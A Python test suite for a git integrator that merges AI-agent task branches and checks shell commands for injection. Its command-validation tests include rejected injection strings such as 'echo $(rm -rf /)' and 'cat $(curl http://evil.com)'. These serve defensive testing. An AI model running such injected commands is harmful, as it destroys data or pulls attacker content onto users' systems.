"""Tests for cagent.integrator — mock git/integrator-agent tests."""

from __future__ import annotations

import asyncio
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from cagent.integrator import (
    _has_conflict_markers,
    _post_integrate_validate,
    _run_claude_agent,
    _run_git,
    _run_shell_cmd,
    _validate_cmd_str,
    integrate,
)
from cagent.integrator.base import _resolve_conflicts, _abort_operation, _is_conflict_xy, _report
from cagent.integrator.cherry_pick import cherry_pick_strategy
from cagent.integrator.merge import merge_strategy
from cagent.integrator.rebase import rebase_strategy
from cagent.tasks import Task

from tests.conftest import AsyncLineIterator, _make_process


def _done_task(tid: str, sha: str) -> Task:
    t = Task(id=tid, prompt=f"Task {tid}", branch=f"task-{tid}")
    t.status = "done"
    t.commit_sha = sha
    return t


# --- _has_conflict_markers tests ---


class TestHasConflictMarkers:
    def test_uu_marker(self) -> None:
        assert _has_conflict_markers("UU file.py\n") is True

    def test_aa_marker(self) -> None:
        assert _has_conflict_markers("AA file.py\n") is True

    def test_dd_marker(self) -> None:
        assert _has_conflict_markers("DD file.py\n") is True

    def test_au_marker(self) -> None:
        assert _has_conflict_markers("AU file.py\n") is True

    def test_no_conflict(self) -> None:
        assert _has_conflict_markers(" M file.py\n") is False

    def test_empty(self) -> None:
        assert _has_conflict_markers("") is False


class TestIsConflictXy:
    """Phase 89.4: unified conflict marker parsing via _is_conflict_xy."""

    def test_uu_is_conflict(self) -> None:
        assert _is_conflict_xy("UU") is True

    def test_au_is_conflict(self) -> None:
        assert _is_conflict_xy("AU") is True

    def test_ua_is_conflict(self) -> None:
        assert _is_conflict_xy("UA") is True

    def test_aa_is_conflict(self) -> None:
        assert _is_conflict_xy("AA") is True

    def test_dd_is_conflict(self) -> None:
        assert _is_conflict_xy("DD") is True

    def test_mm_not_conflict(self) -> None:
        assert _is_conflict_xy("MM") is False

    def test_m_not_conflict(self) -> None:
        assert _is_conflict_xy(" M") is False

    def test_two_char_line_consistent_with_has_conflict_markers(self) -> None:
        """A 2-char line is processed by both helpers identically."""
        for xy in ("UU", "AA", "DD", "AU", "UA", "MM", " M", "??"):
            assert _is_conflict_xy(xy) == _has_conflict_markers(f"{xy} file.py\n"), (
                f"Mismatch for XY={xy!r}"
            )


# --- _run_git tests ---


@pytest.mark.asyncio
async def test_run_git_success(tmp_path: Path) -> None:
    proc = _make_process(returncode=0, stdout=b"output\n")

    with patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=proc):
        result = await _run_git("status", cwd=tmp_path)

    assert result.returncode == 0
    assert result.stdout == "output\n"


@pytest.mark.asyncio
async def test_run_git_failure_raises(tmp_path: Path) -> None:
    proc = _make_process(returncode=1, stderr=b"error\n")

    with patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=proc):
        with pytest.raises(RuntimeError, match="failed"):
            await _run_git("cherry-pick", "abc", cwd=tmp_path)


@pytest.mark.asyncio
async def test_run_git_check_false(tmp_path: Path) -> None:
    proc = _make_process(returncode=1, stderr=b"error\n")

    with patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=proc):
        result = await _run_git("cherry-pick", "abc", cwd=tmp_path, check=False)

    assert result.returncode == 1


# --- integrate tests ---


@pytest.mark.asyncio
async def test_integrate_no_done_tasks(tmp_path: Path) -> None:
    """No done tasks → returns base_sha."""
    tasks = [Task(id="001", prompt="task 1", branch="task-001")]

    with patch("cagent.worktree.create_worktree"):
        result = await integrate(
            tasks=tasks, run_dir=tmp_path / "run",
            base_sha="base123", repo_root=tmp_path,
        )

    assert result == "base123"


@pytest.mark.asyncio
async def test_integrate_cherry_pick_success(tmp_path: Path) -> None:
    """All cherry-picks succeed → returns integration HEAD sha."""
    tasks = [_done_task("001", "sha001"), _done_task("002", "sha002")]
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    # _run_git calls: checkout, checkout, cherry-pick, status(no conflict),
    # rev-parse HEAD
    git_checkout = _make_process(returncode=0)
    git_cherry_pick_ok = _make_process(returncode=0)  # cherry-pick success
    git_sha = _make_process(returncode=0, stdout=b"final_sha\n")

    call_log = []

    async def mock_exec(*args, **kwargs):
        cmd_list = list(args)
        call_log.append(cmd_list)
        if "cherry-pick" in cmd_list:
            return git_cherry_pick_ok
        if "checkout" in cmd_list:
            return git_checkout
        if "rev-parse" in cmd_list:
            return git_sha
        return _make_process(returncode=0)

    with patch("cagent.worktree.create_worktree"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await integrate(
            tasks=tasks, run_dir=run_dir,
            base_sha="base123", repo_root=tmp_path,
        )

    assert result == "final_sha"


@pytest.mark.asyncio
async def test_integrate_partial_failure(tmp_path: Path) -> None:
    """Some cherry-picks fail → partial integration succeeds."""
    tasks = [_done_task("001", "sha001"), _done_task("002", "sha002")]
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    call_count = 0

    async def mock_exec(*args, **kwargs):
        nonlocal call_count
        call_count += 1
        cmd_list = list(args)
        # First cherry-pick succeeds, second fails (non-conflict)
        if "cherry-pick" in cmd_list:
            sha = cmd_list[cmd_list.index("cherry-pick") + 1] if len(cmd_list) > cmd_list.index("cherry-pick") + 1 else ""
            if sha == "sha001":
                return _make_process(returncode=0)
            else:
                return _make_process(returncode=1)
        if "rev-parse" in cmd_list:
            return _make_process(returncode=0, stdout=b"partial_sha\n")
        return _make_process(returncode=0)

    with patch("cagent.worktree.create_worktree"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await integrate(
            tasks=tasks, run_dir=run_dir,
            base_sha="base123", repo_root=tmp_path,
        )

    assert result == "partial_sha"


@pytest.mark.asyncio
async def test_integrate_all_fail_raises(tmp_path: Path) -> None:
    """All cherry-picks fail → RuntimeError."""
    tasks = [_done_task("001", "sha001")]
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    async def mock_exec(*args, **kwargs):
        cmd_list = list(args)
        if "cherry-pick" in cmd_list:
            return _make_process(returncode=1)
        return _make_process(returncode=0)

    with patch("cagent.worktree.create_worktree"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        with pytest.raises(RuntimeError, match="All.*integration attempts failed"):
            await integrate(
                tasks=tasks, run_dir=run_dir,
                base_sha="base123", repo_root=tmp_path,
            )


@pytest.mark.asyncio
async def test_integrate_squash(tmp_path: Path) -> None:
    """Squash mode → reset --soft + commit."""
    tasks = [_done_task("001", "sha001")]
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    git_log = []

    async def mock_exec(*args, **kwargs):
        cmd_list = list(args)
        git_log.append(cmd_list)
        if "rev-parse" in cmd_list:
            return _make_process(returncode=0, stdout=b"squashed_sha\n")
        return _make_process(returncode=0)

    with patch("cagent.worktree.create_worktree"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await integrate(
            tasks=tasks, run_dir=run_dir,
            base_sha="base123", repo_root=tmp_path, squash=True,
        )

    assert result == "squashed_sha"
    # Verify squash commands were called
    git_cmds = [cmd[1] if len(cmd) > 1 else "" for cmd in git_log]
    assert "reset" in git_cmds
    assert "commit" in git_cmds


# --- _run_shell_cmd tests ---


@pytest.mark.asyncio
async def test_run_shell_cmd_success(tmp_path: Path) -> None:
    """Successful command returns 0 and output."""
    proc = _make_process(returncode=0, stdout=b"ok\n")
    with patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=proc):
        code, output = await _run_shell_cmd("echo ok", tmp_path)
    assert code == 0
    assert "ok" in output


@pytest.mark.asyncio
async def test_run_shell_cmd_failure(tmp_path: Path) -> None:
    """Failed command returns nonzero code."""
    proc = _make_process(returncode=1, stdout=b"error details\n")
    with patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=proc):
        code, output = await _run_shell_cmd("false", tmp_path)
    assert code == 1
    assert "error details" in output


@pytest.mark.asyncio
async def test_run_shell_cmd_timeout(tmp_path: Path) -> None:
    """Timed-out command returns 1 and timeout message."""
    proc = AsyncMock()
    proc.communicate = AsyncMock(side_effect=asyncio.TimeoutError())
    proc.kill = MagicMock()
    proc.wait = AsyncMock()

    with patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=proc):
        code, output = await _run_shell_cmd("sleep 999", tmp_path, timeout=1)
    assert code == 1
    assert "timed out" in output.lower()


# --- _post_integrate_validate tests ---


@pytest.mark.asyncio
async def test_post_validate_passes_first_round(tmp_path: Path) -> None:
    """Command passes on first round → returns True."""
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    with patch("cagent.integrator.base._run_shell_cmd", return_value=(0, "all tests pass")):
        result = await _post_integrate_validate(
            cmd_str="pytest",
            worktree_path=tmp_path,
            run_dir=run_dir,
            integrator_model_override=None,
            timeout=60,
            dashboard=None,
        )
    assert result is True


@pytest.mark.asyncio
async def test_post_validate_fails_then_repair_passes(tmp_path: Path) -> None:
    """Command fails round 1, repair agent runs, command passes round 2."""
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    call_count = 0

    async def mock_shell_cmd(cmd_str, cwd, timeout=300):
        nonlocal call_count
        call_count += 1
        if call_count == 1:
            return (1, "FAILED: test_foo.py::test_bar")
        return (0, "all tests pass")

    repair_proc = _make_process(returncode=0, stdout=b"")
    git_proc = _make_process(returncode=0)

    async def mock_exec(*args, **kwargs):
        cmd_list = list(args)
        if any("claude" in str(a).lower() for a in cmd_list):
            return repair_proc
        return git_proc

    with patch("cagent.integrator.base._run_shell_cmd", side_effect=mock_shell_cmd), \
         patch("cagent.integrator.base.prepare_sandbox"), \
         patch("cagent.integrator.base._resolve_claude", return_value="claude"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await _post_integrate_validate(
            cmd_str="pytest",
            worktree_path=tmp_path,
            run_dir=run_dir,
            integrator_model_override=None,
            timeout=60,
            dashboard=None,
        )
    assert result is True
    assert call_count == 2


@pytest.mark.asyncio
async def test_post_validate_fails_both_rounds(tmp_path: Path) -> None:
    """Command fails both rounds → returns False."""
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    repair_proc = _make_process(returncode=0, stdout=b"")
    git_proc = _make_process(returncode=0)

    async def mock_exec(*args, **kwargs):
        cmd_list = list(args)
        if any("claude" in str(a).lower() for a in cmd_list):
            return repair_proc
        return git_proc

    with patch("cagent.integrator.base._run_shell_cmd", return_value=(1, "FAIL")), \
         patch("cagent.integrator.base.prepare_sandbox"), \
         patch("cagent.integrator.base._resolve_claude", return_value="claude"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await _post_integrate_validate(
            cmd_str="pytest",
            worktree_path=tmp_path,
            run_dir=run_dir,
            integrator_model_override=None,
            timeout=60,
            dashboard=None,
        )
    assert result is False


@pytest.mark.asyncio
async def test_post_validate_repair_agent_fails(tmp_path: Path) -> None:
    """Repair agent exits nonzero → gives up immediately, returns False."""
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    repair_proc = _make_process(returncode=1, stdout=b"")

    with patch("cagent.integrator.base._run_shell_cmd", return_value=(1, "FAIL")), \
         patch("cagent.integrator.base.prepare_sandbox"), \
         patch("cagent.integrator.base._resolve_claude", return_value="claude"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=repair_proc):
        result = await _post_integrate_validate(
            cmd_str="pytest",
            worktree_path=tmp_path,
            run_dir=run_dir,
            integrator_model_override=None,
            timeout=60,
            dashboard=None,
        )
    assert result is False


# --- D.1: first task conflicts with base (empty integrated_tasks) ---


@pytest.mark.asyncio
async def test_integrate_first_task_conflict_with_base(tmp_path: Path) -> None:
    """First cherry-pick conflicts with base → integrator gets a meaningful prompt."""
    tasks = [_done_task("001", "sha001")]
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    stdin_captured: list[bytes] = []

    def capture_write(data: bytes):
        stdin_captured.append(data)

    async def mock_exec(*args, **kwargs):
        cmd_list = list(args)
        if "cherry-pick" in cmd_list:
            if "--abort" in cmd_list or "--continue" in cmd_list:
                return _make_process(returncode=0)
            return _make_process(returncode=1)
        if "status" in cmd_list and "--porcelain" in cmd_list:
            return _make_process(returncode=0, stdout=b"UU file.py\n")
        if "grep" in cmd_list:
            return _make_process(returncode=1)  # no conflict markers remain
        if "rev-parse" in cmd_list:
            return _make_process(returncode=0, stdout=b"resolved_sha\n")
        if any("claude" in str(a).lower() for a in cmd_list):
            proc = _make_process(returncode=0, stdout=b"")
            proc.stdin.write = MagicMock(side_effect=capture_write)
            return proc
        return _make_process(returncode=0)

    with patch("cagent.worktree.create_worktree"), \
         patch("cagent.integrator.base.prepare_sandbox"), \
         patch("cagent.integrator.base._resolve_claude", return_value="claude"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await integrate(
            tasks=tasks, run_dir=run_dir,
            base_sha="base123", repo_root=tmp_path,
        )

    assert result == "resolved_sha"
    prompt = b"".join(stdin_captured).decode("utf-8")
    assert "base branch" in prompt
    assert "first integration" in prompt


# --- Strategy tests ---


@pytest.mark.asyncio
async def test_integrate_merge_strategy_success(tmp_path: Path) -> None:
    """Merge strategy: all merges succeed."""
    tasks = [_done_task("001", "sha001"), _done_task("002", "sha002")]
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    call_log = []

    async def mock_exec(*args, **kwargs):
        cmd_list = list(args)
        call_log.append(cmd_list)
        if "rev-parse" in cmd_list:
            return _make_process(returncode=0, stdout=b"merged_sha\n")
        return _make_process(returncode=0)

    with patch("cagent.worktree.create_worktree"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await integrate(
            tasks=tasks, run_dir=run_dir,
            base_sha="base123", repo_root=tmp_path,
            strategy="merge",
        )

    assert result == "merged_sha"
    # Verify merge commands were called
    git_cmds = [cmd[1] if len(cmd) > 1 else "" for cmd in call_log]
    assert "merge" in git_cmds


@pytest.mark.asyncio
async def test_integrate_rebase_strategy_success(tmp_path: Path) -> None:
    """Rebase strategy: all rebases succeed."""
    tasks = [_done_task("001", "sha001"), _done_task("002", "sha002")]
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    call_log = []

    async def mock_exec(*args, **kwargs):
        cmd_list = list(args)
        call_log.append(cmd_list)
        if "rev-parse" in cmd_list:
            return _make_process(returncode=0, stdout=b"rebased_sha\n")
        return _make_process(returncode=0)

    with patch("cagent.worktree.create_worktree"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await integrate(
            tasks=tasks, run_dir=run_dir,
            base_sha="base123", repo_root=tmp_path,
            strategy="rebase",
        )

    assert result == "rebased_sha"
    # Verify cherry-pick commands were called (rebase uses cherry-pick internally)
    git_cmds = [cmd[1] if len(cmd) > 1 else "" for cmd in call_log]
    assert "cherry-pick" in git_cmds


@pytest.mark.asyncio
async def test_integrate_merge_strategy_conflict_resolution(tmp_path: Path) -> None:
    """Merge strategy: conflict occurs, integrator resolves it."""
    tasks = [_done_task("001", "sha001")]
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    stdin_captured: list[bytes] = []

    def capture_write(data: bytes):
        stdin_captured.append(data)

    async def mock_exec(*args, **kwargs):
        cmd_list = list(args)
        if "merge" in cmd_list and "--no-ff" in cmd_list:
            return _make_process(returncode=1)
        if "status" in cmd_list and "--porcelain" in cmd_list:
            return _make_process(returncode=0, stdout=b"UU file.py\n")
        if "grep" in cmd_list:
            return _make_process(returncode=1)  # no conflict markers remain
        if "rev-parse" in cmd_list:
            return _make_process(returncode=0, stdout=b"resolved_sha\n")
        if any("claude" in str(a).lower() for a in cmd_list):
            proc = _make_process(returncode=0, stdout=b"")
            proc.stdin.write = MagicMock(side_effect=capture_write)
            return proc
        return _make_process(returncode=0)

    with patch("cagent.worktree.create_worktree"), \
         patch("cagent.integrator.base.prepare_sandbox"), \
         patch("cagent.integrator.base._resolve_claude", return_value="claude"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await integrate(
            tasks=tasks, run_dir=run_dir,
            base_sha="base123", repo_root=tmp_path,
            strategy="merge",
        )

    assert result == "resolved_sha"
    prompt = b"".join(stdin_captured).decode("utf-8")
    assert "merge conflicts" in prompt.lower()


@pytest.mark.asyncio
async def test_integrate_rebase_strategy_conflict_resolution(tmp_path: Path) -> None:
    """Rebase strategy: conflict occurs, integrator resolves it."""
    tasks = [_done_task("001", "sha001")]
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    stdin_captured: list[bytes] = []

    def capture_write(data: bytes):
        stdin_captured.append(data)

    async def mock_exec(*args, **kwargs):
        cmd_list = list(args)
        if "cherry-pick" in cmd_list:
            if "--abort" in cmd_list or "--continue" in cmd_list:
                return _make_process(returncode=0)
            return _make_process(returncode=1)
        if "status" in cmd_list and "--porcelain" in cmd_list:
            return _make_process(returncode=0, stdout=b"UU file.py\n")
        if "grep" in cmd_list:
            return _make_process(returncode=1)  # no conflict markers remain
        if "rev-parse" in cmd_list:
            return _make_process(returncode=0, stdout=b"resolved_sha\n")
        if any("claude" in str(a).lower() for a in cmd_list):
            proc = _make_process(returncode=0, stdout=b"")
            proc.stdin.write = MagicMock(side_effect=capture_write)
            return proc
        return _make_process(returncode=0)

    with patch("cagent.worktree.create_worktree"), \
         patch("cagent.integrator.base.prepare_sandbox"), \
         patch("cagent.integrator.base._resolve_claude", return_value="claude"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await integrate(
            tasks=tasks, run_dir=run_dir,
            base_sha="base123", repo_root=tmp_path,
            strategy="rebase",
        )

    assert result == "resolved_sha"
    prompt = b"".join(stdin_captured).decode("utf-8")
    assert "merge conflicts" in prompt.lower()


@pytest.mark.asyncio
async def test_integrate_strategy_default_cherry_pick(tmp_path: Path) -> None:
    """Default strategy is cherry-pick."""
    tasks = [_done_task("001", "sha001")]
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    call_log = []

    async def mock_exec(*args, **kwargs):
        cmd_list = list(args)
        call_log.append(cmd_list)
        if "cherry-pick" in cmd_list:
            return _make_process(returncode=0)
        if "rev-parse" in cmd_list:
            return _make_process(returncode=0, stdout=b"cherry_sha\n")
        return _make_process(returncode=0)

    with patch("cagent.worktree.create_worktree"), \
         patch("cagent.integrator.base.asyncio.create_subprocess_exec", side_effect=mock_exec):
        result = await integrate(
            tasks=tasks, run_dir=run_dir,
            base_sha="base123", repo_root=tmp_path,
        )

    assert result == "cherry_sha"
    # Verify cherry-pick was used
    git_cmds = [cmd[1] if len(cmd) > 1 else "" for cmd in call_log]
    assert "cherry-pick" in git_cmds


# --- _validate_cmd_str tests ---


class TestValidateCmdStr:
    """Tests for _validate_cmd_str function."""

    def test_simple_command(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("pytest") is True

    def test_command_with_args(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("pytest tests/ -v") is True

    def test_command_with_path(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("./run_tests.sh") is True

    def test_command_with_flags(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("python -m pytest --tb=short") is True

    def test_command_with_env_vars(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("PYTHONPATH=src pytest") is True

    def test_command_with_pipes(self) -> None:
        from cagent.integrator import _validate_cmd_str
        # Pipes are rejected — they enable shell injection (Phase 90.H1)
        assert _validate_cmd_str("pytest | tee output.txt") is False

    def test_command_with_semicolons(self) -> None:
        from cagent.integrator import _validate_cmd_str
        # Semicolons are rejected — they enable shell injection (Phase 90.H1)
        assert _validate_cmd_str("pytest; echo done") is False

    def test_rejects_null_byte(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("pytest\x00") is False

    def test_rejects_newline(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("pytest\necho hacked") is False

    def test_rejects_carriage_return(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("pytest\r") is False

    def test_rejects_tab(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("pytest\t") is False

    def test_empty_string(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("") is False

    def test_command_with_quotes(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str('pytest -k "test_foo"') is True

    def test_command_with_backticks(self) -> None:
        from cagent.integrator import _validate_cmd_str
        # Backticks trigger command substitution in bash — rejected
        assert _validate_cmd_str("echo `date`") is False

    def test_command_substitution_rejected(self) -> None:
        from cagent.integrator import _validate_cmd_str
        # $(...) command substitution — rejected
        assert _validate_cmd_str("echo $(whoami)") is False
        assert _validate_cmd_str("echo $(rm -rf /)") is False
        assert _validate_cmd_str("cat $(curl http://evil.com)") is False

    def test_trailing_newline_rejected(self) -> None:
        """Python's $ matches before trailing \\n — re.fullmatch closes this."""
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("safe\n") is False

    def test_trailing_crlf_rejected(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("safe\r\n") is False

    def test_embedded_newline_rejected(self) -> None:
        from cagent.integrator import _validate_cmd_str
        assert _validate_cmd_str("safe\nrm -rf /") is False


# --- _run_claude_agent stdin timeout + FileNotFoundError tests ---


class TestRunClaudeAgentStdinTimeout:
    """Tests for _run_claude_agent stdin timeout protection (Phase 66.1)."""

    @pytest.mark.asyncio
    async def test_stdin_wait_closed_timeout_caught(self, tmp_path):
        """wait_closed() raising TimeoutError is caught by try/except — no hang."""
        from cagent.integrator import _run_claude_agent

        proc = _make_process(returncode=0, stdout_lines=[])
        proc.stdin.drain = AsyncMock(return_value=None)
        proc.stdin.wait_closed = AsyncMock(side_effect=TimeoutError)

        with patch("cagent.integrator.base._resolve_claude", return_value="claude"), \
             patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=proc):
            result = await _run_claude_agent(
                prompt="test",
                worktree_path=tmp_path,
                run_dir=tmp_path,
                model_override=None,
                timeout=60,
                dashboard=None,
            )
        # wait_closed TimeoutError is caught, process completes normally
        assert result == 0

    @pytest.mark.asyncio
    async def test_stdin_wait_closed_oserror_caught(self, tmp_path):
        """wait_closed() raising OSError is caught by try/except."""
        from cagent.integrator import _run_claude_agent

        proc = _make_process(returncode=0, stdout_lines=[])
        proc.stdin.drain = AsyncMock(return_value=None)
        proc.stdin.wait_closed = AsyncMock(side_effect=OSError("broken pipe"))

        with patch("cagent.integrator.base._resolve_claude", return_value="claude"), \
             patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=proc):
            result = await _run_claude_agent(
                prompt="test",
                worktree_path=tmp_path,
                run_dir=tmp_path,
                model_override=None,
                timeout=60,
                dashboard=None,
            )
        # OSError in wait_closed is caught, process completes normally
        assert result == 0


class TestRunClaudeAgentFileNotFound:
    """Tests for _run_claude_agent FileNotFoundError handling (Phase 66.2)."""

    @pytest.mark.asyncio
    async def test_file_not_found_returns_none(self, tmp_path):
        from cagent.integrator import _run_claude_agent

        with patch("cagent.integrator.base._resolve_claude", return_value="claude"), \
             patch("cagent.integrator.base.asyncio.create_subprocess_exec",
                   side_effect=FileNotFoundError("claude")):
            result = await _run_claude_agent(
                prompt="test",
                worktree_path=tmp_path,
                run_dir=tmp_path,
                model_override=None,
                timeout=60,
                dashboard=None,
            )
        assert result is None

    @pytest.mark.asyncio
    async def test_os_error_returns_none(self, tmp_path):
        from cagent.integrator import _run_claude_agent

        with patch("cagent.integrator.base._resolve_claude", return_value="claude"), \
             patch("cagent.integrator.base.asyncio.create_subprocess_exec",
                   side_effect=OSError("permission denied")):
            result = await _run_claude_agent(
                prompt="test",
                worktree_path=tmp_path,
                run_dir=tmp_path,
                model_override=None,
                timeout=60,
                dashboard=None,
            )
        assert result is None


# --- _report tests ---


class TestReport:
    def test_report_with_dashboard(self):
        dashboard = MagicMock()
        _report(dashboard, "text", "hello")
        dashboard.update.assert_called_once()
        args = dashboard.update.call_args
        assert args[0][0] == "_integrator"
        assert args[0][1].summary == "hello"
        assert args[0][1].kind == "text"

    def test_report_without_dashboard(self):
        _report(None, "error", "no dashboard")


# --- _abort_operation tests ---


class TestAbortOperation:
    @pytest.mark.asyncio
    async def test_abort_cherry_pick(self, tmp_path):
        with patch("cagent.integrator.base._run_git", new_callable=AsyncMock) as mock_git:
            mock_git.return_value = _git_result(0, "")
            await _abort_operation("cherry-pick", tmp_path)
            mock_git.assert_called_once()
            assert mock_git.call_args[0][:2] == ("cherry-pick", "--abort")

    @pytest.mark.asyncio
    async def test_abort_merge(self, tmp_path):
        with patch("cagent.integrator.base._run_git", new_callable=AsyncMock) as mock_git:
            mock_git.return_value = _git_result(0, "")
            await _abort_operation("merge", tmp_path)
            mock_git.assert_called_once()
            assert mock_git.call_args[0][:2] == ("merge", "--abort")

    @pytest.mark.asyncio
    async def test_abort_rebase(self, tmp_path):
        with patch("cagent.integrator.base._run_git", new_callable=AsyncMock) as mock_git:
            mock_git.return_value = _git_result(0, "")
            await _abort_operation("rebase", tmp_path)
            mock_git.assert_called_once()
            assert mock_git.call_args[0][:2] == ("rebase", "--abort")

    @pytest.mark.asyncio
    async def test_abort_unknown_mode_does_nothing(self, tmp_path):
        with patch("cagent.integrator.base._run_git", new_callable=AsyncMock) as mock_git:
            await _abort_operation("unknown", tmp_path)
            mock_git.assert_not_called()


# --- _run_shell_cmd tests ---


class TestRunShellCmd:
    @pytest.mark.asyncio
    async def test_invalid_cmd_rejected(self, tmp_path):
        rc, output = await _run_shell_cmd("echo\nhello", tmp_path)
        assert rc == 1
        assert "rejected" in output.lower()

    @pytest.mark.asyncio
    async def test_backtick_cmd_rejected(self, tmp_path):
        rc, output = await _run_shell_cmd("echo `whoami`", tmp_path)
        assert rc == 1
        assert "rejected" in output.lower()

    @pytest.mark.asyncio
    async def test_timeout(self, tmp_path):
        mock_proc = AsyncMock()
        mock_proc.communicate = AsyncMock(side_effect=asyncio.TimeoutError)
        mock_proc.kill = MagicMock()
        mock_proc.wait = AsyncMock()
        mock_proc.returncode = -1

        with patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=mock_proc):
            rc, output = await _run_shell_cmd("echo hello", tmp_path, timeout=1)
        assert rc == 1
        assert "timed out" in output.lower()

    @pytest.mark.asyncio
    async def test_successful_cmd(self, tmp_path):
        mock_proc = AsyncMock()
        mock_proc.communicate = AsyncMock(return_value=(b"hello world\n", None))
        mock_proc.returncode = 0

        with patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=mock_proc):
            rc, output = await _run_shell_cmd("echo hello", tmp_path)
        assert rc == 0
        assert "hello world" in output

    @pytest.mark.asyncio
    async def test_timeout_process_lookup_error(self, tmp_path):
        mock_proc = AsyncMock()
        mock_proc.communicate = AsyncMock(side_effect=asyncio.TimeoutError)
        mock_proc.kill = MagicMock(side_effect=ProcessLookupError)
        mock_proc.wait = AsyncMock()
        mock_proc.returncode = None

        with patch("cagent.integrator.base.asyncio.create_subprocess_exec", return_value=mock_proc):
            rc, output = await _run_shell_cmd("echo hello", tmp_path, timeout=1)
        assert rc == 1
        assert "timed out" in output.lower()


# --- _resolve_conflicts tests ---


def _git_result(rc=0, stdout="", stderr=""):
    from cagent.git_utils import GitResult
    return GitResult(returncode=rc, stdout=stdout, stderr=stderr)


class TestResolveConflicts:
    @pytest.mark.asyncio
    async def test_no_conflict_files_returns_false(self, tmp_path):
        """No conflict markers in status -> returns False."""
        with patch("cagent.integrator.base._run_git", new_callable=AsyncMock) as mock_git:
            mock_git.return_value = _git_result(0, "M  file.py\n")
            task = _done_task("1", "abc123")
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=tmp_path, integrator_model_override=None,
                timeout=60, dashboard=None,
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_agent_fails_aborts(self, tmp_path):
        """Agent returns non-zero -> abort and return False."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            if args[0] == "grep":
                return _git_result(1, "")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=1):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=MagicMock(),
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_agent_returns_none_aborts(self, tmp_path):
        """Agent returns None (timeout/crash) -> abort and return False."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
            return _git_result(0, "")

        task = _done_task("1", "abc123")
        with patch("cagent.integrator.base._run_git", side_effect=fake_git), \
             patch("cagent.integrator.base.prepare_sandbox"), \
             patch("cagent.integrator.base._run_claude_agent", new_callable=AsyncMock, return_value=None):
            result = await _resolve_conflicts(
                task=task, integrated_tasks=[], worktree_path=tmp_path,
                run_dir=run_dir, integrator_model_override=None,
                timeout=60, dashboard=None,
            )
        assert result is False

    @pytest.mark.asyncio
    async def test_conflict_markers_remain_aborts(self, tmp_path):
        """Agent succeeds but conflict markers remain -> abort."""
        run_dir = tmp_path / "run"
        run_dir.mkdir()

        async def fake_git(*args, cwd, env=None, check=True, timeout=60):
            if args[0] == "status":
                return _git_result(0, "UU conflict.py\n")
